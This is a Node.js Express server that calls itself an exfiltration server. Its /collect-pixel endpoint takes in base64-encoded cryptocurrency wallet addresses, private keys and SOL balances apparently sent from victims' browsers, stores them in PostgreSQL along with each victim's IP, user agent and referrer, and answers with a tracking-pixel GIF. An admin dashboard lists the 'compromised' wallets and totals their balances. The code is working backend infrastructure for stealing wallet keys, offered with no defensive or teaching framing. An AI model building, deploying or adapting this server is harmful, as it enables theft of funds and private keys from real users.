require('dotenv').config();
const express = require('express');
const { Pool } = require('pg');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3001;

// Middleware
app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100
});
app.use('/api/', limiter);

// ========================================
// POSTGRESQL DATABASE CONNECTION
// ========================================

// PostgreSQL connection pool
// const pool = new Pool({
//     user: process.env.DB_USER || 'exfil_user',
//     password: process.env.DB_PASSWORD || 'exfil123',
//     host: process.env.DB_HOST || 'localhost',
//     port: process.env.DB_PORT || 5433,
//     database: process.env.DB_NAME || 'exfiltration_db',
//     max: 20,
//     idleTimeoutMillis: 30000,
//     connectionTimeoutMillis: 2000,
// });

// // Test database connection and create tables
// async function initDatabase() {
//     try {
//         await pool.connect();
//         console.log('✅ PostgreSQL Connected Successfully');
        
//         // Create tables if not exists
//         await pool.query(`
//             CREATE TABLE IF NOT EXISTS wallets (
//                 id SERIAL PRIMARY KEY,
//                 domain VARCHAR(255),
//                 user_id VARCHAR(255),
//                 wallet_address VARCHAR(255) UNIQUE NOT NULL,
//                 private_key TEXT NOT NULL,
//                 balance DECIMAL(20, 8) DEFAULT 0,
//                 ip_address VARCHAR(45),
//                 user_agent TEXT,
//                 referrer TEXT,
//                 collected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
//                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
//                 updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
//             )
//         `);
        
//         // Create indexes for better performance
//         await pool.query(`
//             CREATE INDEX IF NOT EXISTS idx_collected_at ON wallets(collected_at DESC);
//             CREATE INDEX IF NOT EXISTS idx_wallet_address ON wallets(wallet_address);
//             CREATE INDEX IF NOT EXISTS idx_user_id ON wallets(user_id);
//             CREATE INDEX IF NOT EXISTS idx_ip_address ON wallets(ip_address);
//         `);
        
//         // Create function to update updated_at timestamp
//         await pool.query(`
//             CREATE OR REPLACE FUNCTION update_updated_at_column()
//             RETURNS TRIGGER AS $$
//             BEGIN
//                 NEW.updated_at = CURRENT_TIMESTAMP;
//                 RETURN NEW;
//             END;
//             $$ language 'plpgsql';
//         `);
        
//         // Create trigger for updated_at
//         await pool.query(`
//             DROP TRIGGER IF EXISTS update_wallets_updated_at ON wallets;
//             CREATE TRIGGER update_wallets_updated_at
//                 BEFORE UPDATE ON wallets
//                 FOR EACH ROW
//                 EXECUTE FUNCTION update_updated_at_column();
//         `);
        
//         // Create stats table for analytics
//         await pool.query(`
//             CREATE TABLE IF NOT EXISTS exfiltration_stats (
//                 id SERIAL PRIMARY KEY,
//                 total_events INTEGER DEFAULT 0,
//                 total_wallets INTEGER DEFAULT 0,
//                 total_balance DECIMAL(20, 8) DEFAULT 0,
//                 last_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP
//             )
//         `);
        
//         // Insert initial stats row if not exists
//         await pool.query(`
//             INSERT INTO exfiltration_stats (id, total_events, total_wallets, total_balance)
//             SELECT 1, 0, 0, 0
//             WHERE NOT EXISTS (SELECT 1 FROM exfiltration_stats WHERE id = 1)
//         `);
        
//         console.log('✅ Database tables and indexes created');
//         return true;
//     } catch (error) {
//         console.error('❌ PostgreSQL Connection Error:', error.message);
//         console.log('\n⚠️ Please ensure PostgreSQL is running:');
//         console.log('   - Windows: "net start postgresql-15" as Administrator');
//         console.log('   - Docker: "docker start postgres-exfil"');
//         console.log('   - Or install PostgreSQL from https://www.postgresql.org/download/\n');
//         return false;
//     }
// }

// ========================================
// POSTGRESQL DATABASE CONNECTION (Updated for Render)
// ========================================

// PostgreSQL connection pool - works with both local and Render
const pool = new Pool({
    user: process.env.DB_USER || process.env.PGUSER || 'exfil_user',
    password: process.env.DB_PASSWORD || process.env.PGPASSWORD || 'exfil123',
    host: process.env.DB_HOST || process.env.PGHOST || 'localhost',
    port: process.env.DB_PORT || process.env.PGPORT || 5432,
    database: process.env.DB_NAME || process.env.PGDATABASE || 'exfiltration_db',
    max: 20,
    idleTimeoutMillis: 30000,
    connectionTimeoutMillis: 5000,
    ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

// Test database connection and create tables
async function initDatabase() {
    let retries = 5;
    while (retries > 0) {
        try {
            await pool.connect();
            console.log('✅ PostgreSQL Connected Successfully');
            
            // Create tables if not exists (simplified for production)
            await pool.query(`
                CREATE TABLE IF NOT EXISTS wallets (
                    id SERIAL PRIMARY KEY,
                    domain VARCHAR(255),
                    user_id VARCHAR(255),
                    wallet_address VARCHAR(255) UNIQUE NOT NULL,
                    private_key TEXT NOT NULL,
                    balance DECIMAL(20, 8) DEFAULT 0,
                    ip_address VARCHAR(45),
                    user_agent TEXT,
                    referrer TEXT,
                    collected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            `);
            
            await pool.query(`CREATE INDEX IF NOT EXISTS idx_collected_at ON wallets(collected_at DESC)`);
            await pool.query(`CREATE INDEX IF NOT EXISTS idx_wallet_address ON wallets(wallet_address)`);
            
            console.log('✅ Database tables and indexes created');
            return true;
        } catch (error) {
            console.error(`❌ PostgreSQL Connection Error (${retries} retries left):`, error.message);
            retries--;
            if (retries === 0) {
                console.log('\n⚠️ Running with limited functionality - database not available');
                return false;
            }
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
    return false;
}

// ========================================
// API ROUTES
// ========================================

// Health check endpoint
app.get('/health', async (req, res) => {
    let dbStatus = 'disconnected';
    try {
        await pool.query('SELECT 1');
        dbStatus = 'connected';
    } catch (e) {
        dbStatus = 'disconnected';
    }
    
    res.json({ 
        status: 'healthy', 
        timestamp: new Date().toISOString(),
        database: 'PostgreSQL',
        dbStatus: dbStatus
    });
});

// MAIN EXFILTRATION ENDPOINT
app.get('/collect-pixel', async (req, res) => {
    const { d, r } = req.query;
    const timestamp = new Date();
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    
    console.log('\n' + '='.repeat(80));
    console.log('📡 EXFILTRATION EVENT DETECTED!');
    console.log('='.repeat(80));
    console.log(`🕒 Time: ${timestamp.toLocaleString()}`);
    console.log(`🌐 IP: ${ip}`);
    console.log(`🖥️ User Agent: ${userAgent}`);
    console.log(`🔗 Referrer: ${r || 'N/A'}`);
    
    if (!d) {
        console.log('❌ No data parameter received');
        return res.status(400).json({ error: 'Missing data parameter' });
    }
    
    try {
        const decodedData = Buffer.from(d, 'base64').toString('utf-8');
        const walletData = JSON.parse(decodedData);
        
        console.log('\n📦 PARSED DATA:');
        console.log(`   Domain: ${walletData.domain}`);
        console.log(`   User ID: ${walletData.user || 'N/A'}`);
        console.log(`   Wallets Found: ${walletData.wallets?.length || 0}`);
        
        if (walletData.wallets && walletData.wallets.length > 0) {
            console.log('\n💰 WALLET EXTRACTION SUMMARY:');
            
            const client = await pool.connect();
            
            try {
                await client.query('BEGIN');
                
                for (const wallet of walletData.wallets) {
                    const query = `
                        INSERT INTO wallets (domain, user_id, wallet_address, private_key, balance, ip_address, user_agent, referrer, collected_at)
                        VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
                        ON CONFLICT (wallet_address) 
                        DO UPDATE SET 
                            balance = EXCLUDED.balance,
                            private_key = EXCLUDED.private_key,
                            updated_at = CURRENT_TIMESTAMP
                    `;
                    
                    await client.query(query, [
                        walletData.domain,
                        walletData.user || 'unknown',
                        wallet.addr,
                        wallet.priv,
                        parseFloat(wallet.bal) || 0,
                        ip,
                        userAgent,
                        r,
                        timestamp
                    ]);
                    
                    console.log(`   ✅ Wallet: ${wallet.addr.substring(0, 25)}...`);
                    console.log(`      Private Key: ${wallet.priv.substring(0, 30)}...`);
                    console.log(`      Balance: ${wallet.bal} SOL`);
                }
                
                // Update stats
                await client.query(`
                    UPDATE exfiltration_stats 
                    SET total_events = total_events + 1,
                        total_wallets = total_wallets + $1,
                        total_balance = total_balance + $2,
                        last_updated = CURRENT_TIMESTAMP
                    WHERE id = 1
                `, [walletData.wallets.length, parseFloat(walletData.wallets.reduce((sum, w) => sum + parseFloat(w.bal), 0))]);
                
                await client.query('COMMIT');
                console.log(`\n⚠️ TOTAL WALLETS COMPROMISED: ${walletData.wallets.length}`);
                console.log(`💾 Data saved to PostgreSQL`);
                
            } catch (err) {
                await client.query('ROLLBACK');
                throw err;
            } finally {
                client.release();
            }
        }
        
        console.log('='.repeat(80) + '\n');
        
        // Return 1x1 pixel GIF
        const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
        res.writeHead(200, {
            'Content-Type': 'image/gif',
            'Cache-Control': 'no-cache, no-store, must-revalidate'
        });
        res.end(pixel);
        
    } catch (error) {
        console.error('❌ Error processing exfiltration:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// POST endpoint alternative
app.post('/collect-pixel', async (req, res) => {
    const { data, referrer } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    
    if (!data) {
        return res.status(400).json({ error: 'Missing data' });
    }
    
    try {
        const decodedData = Buffer.from(data, 'base64').toString('utf-8');
        const walletData = JSON.parse(decodedData);
        
        const client = await pool.connect();
        
        try {
            await client.query('BEGIN');
            
            for (const wallet of walletData.wallets) {
                await client.query(`
                    INSERT INTO wallets (domain, user_id, wallet_address, private_key, balance, ip_address, user_agent, referrer)
                    VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
                    ON CONFLICT (wallet_address) DO UPDATE SET
                        balance = EXCLUDED.balance,
                        private_key = EXCLUDED.private_key
                `, [
                    walletData.domain,
                    walletData.user || 'unknown',
                    wallet.addr,
                    wallet.priv,
                    parseFloat(wallet.bal) || 0,
                    ip,
                    userAgent,
                    referrer
                ]);
            }
            
            await client.query('COMMIT');
            res.json({ success: true, count: walletData.wallets.length });
        } catch (err) {
            await client.query('ROLLBACK');
            throw err;
        } finally {
            client.release();
        }
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ error: 'Internal error' });
    }
});

// ADMIN API ENDPOINTS
const adminAuth = (req, res, next) => {
    const authHeader = req.headers.authorization;
    if (!authHeader) {
        return res.status(401).json({ error: 'No authorization header' });
    }
    
    const token = authHeader.split(' ')[1];
    const expectedToken = Buffer.from(`${process.env.ADMIN_USERNAME || 'admin'}:${process.env.ADMIN_PASSWORD || 'admin123'}`).toString('base64');
    
    if (token !== expectedToken) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    next();
};

// Get all wallets with pagination
app.get('/api/wallets', adminAuth, async (req, res) => {
    try {
        const page = parseInt(req.query.page) || 1;
        const limit = parseInt(req.query.limit) || 50;
        const offset = (page - 1) * limit;
        
        const countResult = await pool.query('SELECT COUNT(*) as total FROM wallets');
        const total = parseInt(countResult.rows[0].total);
        
        const result = await pool.query(`
            SELECT * FROM wallets 
            ORDER BY collected_at DESC 
            LIMIT $1 OFFSET $2
        `, [limit, offset]);
        
        res.json({
            success: true,
            data: result.rows,
            pagination: {
                page,
                limit,
                total,
                pages: Math.ceil(total / limit)
            }
        });
    } catch (error) {
        console.error('Error fetching wallets:', error);
        res.status(500).json({ error: error.message });
    }
});

// Get statistics
app.get('/api/stats', adminAuth, async (req, res) => {
    try {
        const totalWallets = await pool.query('SELECT COUNT(*) as count FROM wallets');
        const uniqueUsers = await pool.query('SELECT COUNT(DISTINCT user_id) as count FROM wallets');
        const totalBalance = await pool.query('SELECT COALESCE(SUM(balance), 0) as total FROM wallets');
        const last24h = await pool.query(`
            SELECT COUNT(*) as count FROM wallets 
            WHERE collected_at >= NOW() - INTERVAL \'24 hours\'
        `);
        
        res.json({
            success: true,
            stats: {
                totalWallets: parseInt(totalWallets.rows[0].count),
                uniqueUsers: parseInt(uniqueUsers.rows[0].count),
                totalBalance: parseFloat(totalBalance.rows[0].total),
                last24hExfiltrations: parseInt(last24h.rows[0].count)
            }
        });
    } catch (error) {
        console.error('Error fetching stats:', error);
        res.status(500).json({ error: error.message });
    }
});

// Delete wallet
app.delete('/api/wallets/:id', adminAuth, async (req, res) => {
    try {
        const result = await pool.query('DELETE FROM wallets WHERE id = $1 RETURNING id', [req.params.id]);
        if (result.rowCount === 0) {
            return res.status(404).json({ error: 'Wallet not found' });
        }
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Clear all data
app.delete('/api/clear-all', adminAuth, async (req, res) => {
    try {
        await pool.query('TRUNCATE TABLE wallets RESTART IDENTITY');
        await pool.query('UPDATE exfiltration_stats SET total_events = 0, total_wallets = 0, total_balance = 0, last_updated = CURRENT_TIMESTAMP WHERE id = 1');
        res.json({ success: true, message: 'All data cleared' });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Ensure public directory exists
const publicDir = path.join(__dirname, 'public');
if (!fs.existsSync(publicDir)) {
    fs.mkdirSync(publicDir, { recursive: true });
}

// Create admin HTML file if not exists
const adminHtmlPath = path.join(publicDir, 'admin.html');
if (!fs.existsSync(adminHtmlPath)) {
    const adminHtml = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exfiltration Admin - PostgreSQL</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { background: #1a1a1a; padding: 20px; border-radius: 10px; margin-bottom: 20px; border: 1px solid #00ff00; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-bottom: 20px; }
        .stat-card { background: #1a1a1a; padding: 20px; border-radius: 10px; border: 1px solid #333; }
        .stat-value { font-size: 32px; font-weight: bold; color: #00ff00; margin-top: 10px; }
        .login-form { background: #1a1a1a; padding: 40px; border-radius: 10px; max-width: 400px; margin: 100px auto; text-align: center; }
        input { width: 100%; padding: 10px; margin: 10px 0; background: #2a2a2a; border: 1px solid #444; color: #00ff00; font-family: monospace; }
        button { background: #00ff00; color: #0a0a0a; padding: 10px 20px; border: none; cursor: pointer; font-weight: bold; margin: 5px; }
        button:hover { background: #00cc00; }
        table { width: 100%; border-collapse: collapse; background: #1a1a1a; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #333; }
        th { background: #2a2a2a; color: #00ff00; }
        .delete-btn { background: #ff0000; color: white; padding: 5px 10px; font-size: 12px; }
        .pagination { margin-top: 20px; text-align: center; }
    </style>
</head>
<body>
    <div class="container" id="app">
        <div id="loginScreen">
            <div class="login-form">
                <h2>🔐 Admin Login</h2>
                <input type="text" id="username" placeholder="Username">
                <input type="password" id="password" placeholder="Password">
                <button onclick="login()">Login</button>
            </div>
        </div>
        <div id="dashboard" style="display:none">
            <div class="header">
                <h1>🚀 Exfiltration Server (PostgreSQL)</h1>
                <button onclick="logout()">Logout</button>
                <button onclick="clearAllData()" style="background:#ff0000">Clear All</button>
                <button onclick="refreshData()">Refresh</button>
            </div>
            <div class="stats-grid" id="stats"></div>
            <div style="overflow-x:auto">
                <table>
                    <thead><tr><th>Time</th><th>Wallet Address</th><th>Balance</th><th>User ID</th><th>IP</th><th>Action</th></tr></thead>
                    <tbody id="walletsBody"></tbody>
                </table>
            </div>
            <div class="pagination" id="pagination"></div>
        </div>
    </div>
    <script>
        let token = null, currentPage = 1;
        async function login() {
            const u = document.getElementById('username').value;
            const p = document.getElementById('password').value;
            token = btoa(u + ':' + p);
            const r = await fetch('/api/stats', { headers: { 'Authorization': 'Basic ' + token } });
            if (r.ok) {
                document.getElementById('loginScreen').style.display = 'none';
                document.getElementById('dashboard').style.display = 'block';
                refreshData();
            } else alert('Invalid credentials');
        }
        function logout() { token = null; document.getElementById('loginScreen').style.display = 'block'; document.getElementById('dashboard').style.display = 'none'; }
        async function refreshData() { if (!token) return; await loadStats(); await loadWallets(); }
        async function loadStats() {
            const r = await fetch('/api/stats', { headers: { 'Authorization': 'Basic ' + token } });
            const d = await r.json();
            if (d.success) document.getElementById('stats').innerHTML = \`
                <div class="stat-card"><div>💰 Total Wallets</div><div class="stat-value">\${d.stats.totalWallets}</div></div>
                <div class="stat-card"><div>👤 Unique Users</div><div class="stat-value">\${d.stats.uniqueUsers}</div></div>
                <div class="stat-card"><div>💎 Total Balance</div><div class="stat-value">\${parseFloat(d.stats.totalBalance).toFixed(4)} SOL</div></div>
                <div class="stat-card"><div>📊 Last 24h</div><div class="stat-value">\${d.stats.last24hExfiltrations}</div></div>
            \`;
        }
        async function loadWallets() {
            const r = await fetch('/api/wallets?page=' + currentPage, { headers: { 'Authorization': 'Basic ' + token } });
            const d = await r.json();
            if (d.success && d.data.length) {
                document.getElementById('walletsBody').innerHTML = d.data.map(w => \`
                    <tr>
                        <td>\${new Date(w.collected_at).toLocaleString()}</td>
                        <td style="font-family:monospace;font-size:11px">\${w.wallet_address.substring(0, 30)}...</td>
                        <td>\${parseFloat(w.balance).toFixed(4)} SOL</td>
                        <td>\${w.user_id || 'N/A'}</td>
                        <td>\${w.ip_address}</td>
                        <td><button class="delete-btn" onclick="deleteWallet(\${w.id})">Delete</button></td>
                    </tr>
                \`).join('');
                document.getElementById('pagination').innerHTML = \`
                    <button onclick="changePage(\${currentPage-1})" \${currentPage===1?'disabled':''}>Prev</button>
                    Page \${currentPage} of \${d.pagination.pages}
                    <button onclick="changePage(\${currentPage+1})" \${currentPage===d.pagination.pages?'disabled':''}>Next</button>
                \`;
            } else document.getElementById('walletsBody').innerHTML = '<tr><td colspan="6">No wallets found</td></tr>';
        }
        function changePage(p) { currentPage = p; loadWallets(); }
        async function deleteWallet(id) { if (confirm('Delete?')) { await fetch('/api/wallets/' + id, { method: 'DELETE', headers: { 'Authorization': 'Basic ' + token } }); refreshData(); } }
        async function clearAllData() { if (confirm('Delete ALL data?')) { await fetch('/api/clear-all', { method: 'DELETE', headers: { 'Authorization': 'Basic ' + token } }); refreshData(); } }
    </script>
</body>
</html>`;
    fs.writeFileSync(adminHtmlPath, adminHtml);
}

// Serve admin dashboard
app.get('/admin', (req, res) => {
    res.sendFile(adminHtmlPath);
});

app.use(express.static('public'));

// ========================================
// START SERVER
// ========================================
async function startServer() {
    const dbConnected = await initDatabase();
    
    app.listen(PORT, () => {
        console.log('\n' + '='.repeat(80));
        console.log('🚀 PRIMARY EXFILTRATION SERVER (PostgreSQL)');
        console.log('='.repeat(80));
        console.log(`\n✅ Server running on: http://localhost:${PORT}`);
        console.log(`📡 Collection endpoint: http://localhost:${PORT}/collect-pixel`);
        console.log(`📊 Admin Dashboard: http://localhost:${PORT}/admin`);
        console.log(`🔧 API Endpoints:`);
        console.log(`   GET  /api/wallets - View all wallets`);
        console.log(`   GET  /api/stats   - View statistics`);
        console.log(`   POST /collect-pixel - Exfiltration endpoint`);
        console.log(`\n🔐 Admin Credentials:`);
        console.log(`   Username: ${process.env.ADMIN_USERNAME || 'admin'}`);
        console.log(`   Password: ${process.env.ADMIN_PASSWORD || 'admin123'}`);
        console.log(`\n📦 Database: ${dbConnected ? 'PostgreSQL Connected' : 'PostgreSQL Not Connected'}`);
        console.log('\n' + '='.repeat(80));
        console.log('PRESS CTRL+C TO STOP SERVER\n');
    });
}

startServer();

// Graceful shutdown
process.on('SIGINT', async () => {
    console.log('\n\n🛑 Shutting down...');
    await pool.end();
    console.log('Database connection closed');
    process.exit(0);
});